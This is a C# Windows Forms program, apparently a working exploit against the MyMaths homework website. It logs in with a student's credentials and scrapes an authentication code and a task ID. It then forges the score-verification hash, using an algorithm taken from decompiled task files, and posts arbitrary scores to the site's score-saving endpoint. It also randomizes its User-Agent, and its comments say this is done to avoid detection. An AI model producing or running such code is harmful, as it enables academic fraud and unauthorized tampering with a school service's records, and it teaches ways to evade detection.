using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Text.RegularExpressions;
using System.Web;

namespace mymaths_exploit
{
    public partial class Form1 : Form
    {
        // have we retrieved the authCode
        bool gotAuthCode = false;
        // have we retrieved the taskID
        bool gotTaskID = false;

        // the sCode
        long sCode;
        // the score for question 1
        int q1score;
        // the score for question 2
        int q2score;
        // the taskID
        int taskID;
        // the authCode
        int authCode;

        // the random number for the ?h= parameter in /indexLog.asp (probably not needed but included anyway to reduce risk of detection
        int rand = 0;

        // a container string to be converted to a byte[] for the POST data used to submit the username and password
        string postData;
        // the POST data itself
        byte[] postByte;

        // a container string that will contain the data returned by /auth.asp once logged in
        string authstring;

        // the UserAgent used by the browser to reduce risk of detection (by .NET CLR tag), containing default agent of Firefox 15.0.1 on Windows 7 64-bit
        string UserAgent = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1";

        // a container for the final URL that will contain our generated sCode and modified parameters
        Uri finalUrl;

        // Windows Forms generated code
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // the random number generator for the ?h= parameter
            Random r = new Random();
            rand = r.Next(00000, 99999);

            // randomizes the UserAgent to reduce risk of detection
            randomizeUserAgent(r.Next(1,5));

            // set browser text to instruction page
            w.DocumentText = Properties.Resources.intro.ToString();
        }

        private void randomizeUserAgent(int value)
        {
            // randomises the UserAgent value to be used by the browser
            const string prefix = "User-Agent: ";
            string newUserAgent = "";
            switch (value)
            {
                case 1:
                    newUserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)";
                    break;
                case 2:
                    newUserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5";
                    break;
                case 3:
                    newUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10";
                    break;
                case 4:
                    newUserAgent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)";
                    break;
                case 5:
                    newUserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1";
                    break;
                default:
                    newUserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1";
                    break;
            }
            UserAgent = prefix + newUserAgent;
        }

        void w_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            string loc = e.Url.AbsoluteUri;
            // if we're on the MyMaths home page, try to log in with the username and password supplies
            // if the username and password are either incorrect or not supplied, this will result in an endless loop
            if (loc == "http://www.mymaths.co.uk/" || loc == "http://www.mymaths.co.uk/index.asp")
            {
                w.Navigate("http://www.mymaths.co.uk/indexLog.asp?h=" + rand, null, postByte, "Content-Type: application/x-www-form-urlencoded\r\n" + UserAgent);
            }
            // if we don't have the authCode, and we've been logged in, go to auth.asp
            if (!gotAuthCode)
            {
                if (loc.Contains("http://www.mymaths.co.uk/indexLog.asp"))
                {
                    w.Navigate("http://www.mymaths.co.uk/auth.asp", null, null, UserAgent);
                }

                // if we're on auth.asp, get the authCode value from it and parse it
                else if (loc.Contains("http://www.mymaths.co.uk/auth.asp"))
                {
                    authstring = w.DocumentText;
                    Properties.Settings.Default.authCode = Int32.Parse(HttpUtility.ParseQueryString(authstring).Get("authCode"));
                    gotAuthCode = true;
                    w.Navigate("http://www.mymaths.co.uk", null, null, UserAgent);
                }
            }
            // if we don't have the taskID, and we're on a task page, parse the taskID from the task URL
            else if (!gotTaskID)
            {
                if (loc.Contains("&taskID="))
                {
                    Properties.Settings.Default.taskID = Int32.Parse(HttpUtility.ParseQueryString(loc).Get("taskID"));
                    groupBox3.Enabled = true;
                }
            }
            // if we're on the page returned by saveDataOH.asp, and the score has been saved, show a message box telling the user everything's gone well
            if (w.DocumentText.Contains("&scoresaved=1"))
            {
                DialogResult result = MessageBox.Show("looks like it worked. do another task?", "mymaths-exploit", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                switch (result)
                {
                    case DialogResult.Yes:
                        w.Navigate("http://www.mymaths.co.uk/indexLog.asp");
                        break;
                    default:
                        Application.Exit();
                        break;
                }
            }
            Properties.Settings.Default.Save();
        }

        // fires whenever MyMaths attempts to open another task in a new window
        private void w_NewWindow(object sender, CancelEventArgs e)
        {
            MessageBox.Show("a new window is going to open up in Internet Explorer with the task you have just selected", "mymaths-exploit", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            MessageBox.Show("please copy and paste the address of the url into the task box click load task", "mymaths-exploit", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            groupBox1.Enabled = true;
        }

        // the loadTask button, navigate to the URL entered into the text box
        private void button2_Click(object sender, EventArgs e)
        {
            w.Navigate(textBox1.Text, null, null, UserAgent);
        }

        // the sCode generator, using the algorithm ported over from the decompiled task SWF files
        public void gensCode(int q1, int q2)
        {
            authCode = Properties.Settings.Default.authCode;
            taskID = Properties.Settings.Default.taskID;
            q1score = q1;
            q2score = q2;
            sCode = authCode * taskID;
            sCode = (sCode + (q1score * 100)) + q2score;
            sCode = sCode * 10000;
            sCode = sCode + (taskID * taskID);

            // format the modified URL
            finalUrl = new Uri(String.Format("http://www.mymaths.co.uk/studentRecords/saveDataOH.asp?sCode={0}&q1score={1}&q2score={2}&taskID={3}", sCode, q1score, q2score, taskID));
            // navigate to it, hopefully saving the score
            w.Navigate(finalUrl, null, null, UserAgent);
        }

        // the SET button, passes the two score values to gensCode()
        private void button1_Click(object sender, EventArgs e)
        {
            gensCode(Convert.ToInt32(q1.Value), Convert.ToInt32(q2.Value));
        }

        // the SUBMIT button, passes the username and password to captureLogin()
        private void button3_Click(object sender, EventArgs e)
        {
            captureLogin(user.Text, pass.Text);
        }

        // sets the POST data byte to the username and password, as well as the other essential variables
        private void captureLogin(string username, string password)
        {
            // the string to byte converter
            System.Text.Encoding a = System.Text.Encoding.UTF8;
            // the POST string itself
            // @TODO: maybe grab the timestamp variable from the html input if this changes
            postData = String.Format("xlog={0}&xpas={1}&timestamp=306&returns=&Submit=GO&flashPlayer=11", username, password);
            // converts the POST string to a byte[]
            postByte = a.GetBytes(postData);
            // attempts to log in to MyMaths by submitting the POST data
            w.Navigate("http://www.mymaths.co.uk/indexLog.asp?h=" + rand, null, postByte, "Content-Type: application/x-www-form-urlencoded");
        }

        // if the user presses ENTER in the password text box, then click SUBMIT automatically
        private void pass_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.Handled = true;
                button3.PerformClick();
            }
        }

        // the sCode generator button (for manual exploiting)
        private void button4_Click(object sender, EventArgs e)
        {
            var c = new Form2();
            c.Show();
        }

        // the DEBUG INFO button, for advanced users to view the randomised User-Agent, authCode, and taskID
        private void button5_Click(object sender, EventArgs e)
        {
            string message = String.Format(
            @"{0}
authCode: {1}
taskID: {2}", UserAgent, authCode, taskID);
            MessageBox.Show(message);
        }
    }
}
